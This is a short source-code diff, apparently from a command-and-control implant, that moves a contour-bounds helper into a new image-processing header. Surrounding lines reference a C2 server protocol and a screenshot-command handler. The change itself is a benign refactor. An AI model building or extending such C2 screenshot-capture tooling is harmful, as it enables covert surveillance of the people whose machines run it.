@@ -10,6 +10,7 @@
 #include "vector.h"
 #include "system_info.h"
 #include "string.h"
+#include "image_processor.h"
 
 // =============================================================================
 // Wire-format directory entry — fixed layout matching the C2 server protocol.
@@ -437,19 +438,7 @@ PRGB CopyRGBData(UINT32 height, UINT32 weight, Graphics &graphics, const ScreenD
     return rect;
 }
 
-VOID GetContourBounds(PContour contourArray, INT32& minX, INT32& minY, INT32& maxX, INT32& maxY)
-{   
-    for(INT32 i = 0; i < contourArray->Count; i++){
-        if(contourArray->Points[i].Col < minX)
-            minX = contourArray->Points[i].Col;
-        if(contourArray->Points[i].Col > maxX)
-            maxX = contourArray->Points[i].Col;
-        if(contourArray->Points[i].Row < minY)
-            minY = contourArray->Points[i].Row;
-        if(contourArray->Points[i].Row > maxY)
-            maxY = contourArray->Points[i].Row;
-    }
-}
+
 // Gets a screenshot of the specified display device
 VOID Handle_GetScreenshotCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
 {
